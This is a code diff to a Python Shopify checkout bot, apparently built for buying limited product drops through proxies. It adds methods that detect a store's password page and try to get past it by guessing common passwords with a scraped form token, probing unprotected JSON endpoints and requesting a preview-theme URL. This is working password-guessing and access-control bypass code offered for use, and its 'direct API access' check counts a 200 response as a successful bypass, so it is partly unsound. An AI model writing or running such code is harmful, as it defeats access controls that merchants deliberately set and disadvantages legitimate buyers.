@@ -64,6 +64,16 @@ class ShopifyCheckout:
             # Create session with proxy
             session = await self._create_session(proxy, task.id)
             
+            # Check for password page and attempt bypass
+            if await self._is_password_protected(session, task.config.site_url):
+                task.update_status(TaskStatus.MONITORING, "Bypassing password page...")
+                bypass_result = await self._bypass_password_page(session, task.config.site_url)
+                if not bypass_result:
+                    return TaskResult(
+                        success=False,
+                        error_message="Site is password protected - bypass failed"
+                    )
+            
             # Step 1: Find product and add to cart
             task.update_status(TaskStatus.ADDING_TO_CART, "Adding to cart...")
             
@@ -504,3 +514,130 @@ class ShopifyCheckout:
             "gateway_id": "credit_card",
             "token": "placeholder"
         }
+    
+    async def _is_password_protected(
+        self,
+        session: httpx.AsyncClient,
+        site_url: str
+    ) -> bool:
+        """Check if site is password protected"""
+        base_url = site_url.rstrip('/')
+        
+        try:
+            response = await session.get(base_url, follow_redirects=False)
+            
+            # Check for password page redirect
+            if response.status_code in (301, 302, 307, 308):
+                location = response.headers.get("location", "")
+                if "password" in location.lower():
+                    return True
+            
+            # Check response content for password form
+            if response.status_code == 200:
+                content = response.text.lower()
+                if "password" in content and "enter store using password" in content:
+                    return True
+                if 'id="password"' in content or 'name="password"' in content:
+                    return True
+            
+            return False
+            
+        except Exception as e:
+            logger.warning("Password check error", error=str(e))
+            return False
+    
+    async def _bypass_password_page(
+        self,
+        session: httpx.AsyncClient,
+        site_url: str,
+        passwords: Optional[List[str]] = None
+    ) -> bool:
+        """
+        Attempt to bypass password-protected Shopify page
+        
+        Strategies:
+        1. Try common passwords (if enabled)
+        2. Access products.json directly (sometimes not protected)
+        3. Use cart.js endpoint directly
+        4. Try preview links
+        """
+        base_url = site_url.rstrip('/')
+        
+        # Strategy 1: Try direct API access (often not password protected)
+        try:
+            api_urls = [
+                f"{base_url}/products.json",
+                f"{base_url}/collections.json",
+                f"{base_url}/cart.js",
+            ]
+            
+            for api_url in api_urls:
+                response = await session.get(api_url)
+                if response.status_code == 200:
+                    logger.info("Password bypass via direct API access", url=api_url)
+                    return True
+                    
+        except Exception:
+            pass
+        
+        # Strategy 2: Try common/leaked passwords
+        common_passwords = passwords or [
+            "",  # Sometimes empty works
+            "password",
+            "shop",
+            "preview",
+            "sneakers",
+            "launch",
+            "drop",
+            "exclusive",
+        ]
+        
+        password_url = f"{base_url}/password"
+        
+        for password in common_passwords:
+            try:
+                # Get the password page to extract form token
+                page_response = await session.get(password_url)
+                
+                if page_response.status_code != 200:
+                    continue
+                
+                # Extract authenticity token
+                content = page_response.text
+                token_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', content)
+                
+                form_token = token_match.group(1) if token_match else ""
+                
+                # Submit password
+                data = {
+                    "password": password,
+                    "authenticity_token": form_token,
+                }
+                
+                response = await session.post(
+                    password_url,
+                    data=data,
+                    headers={"Content-Type": "application/x-www-form-urlencoded"},
+                    follow_redirects=True
+                )
+                
+                # Check if we got through
+                final_url = str(response.url)
+                if "password" not in final_url.lower():
+                    logger.info("Password bypass successful", password=password[:3] + "***")
+                    return True
+                    
+            except Exception:
+                continue
+        
+        # Strategy 3: Try accessing via preview token in URL (if any were shared)
+        try:
+            preview_response = await session.get(f"{base_url}?preview_theme_id=current")
+            if preview_response.status_code == 200 and "password" not in preview_response.text.lower():
+                logger.info("Password bypass via preview theme")
+                return True
+        except Exception:
+            pass
+        
+        logger.warning("Password bypass failed - all strategies exhausted")
+        return False
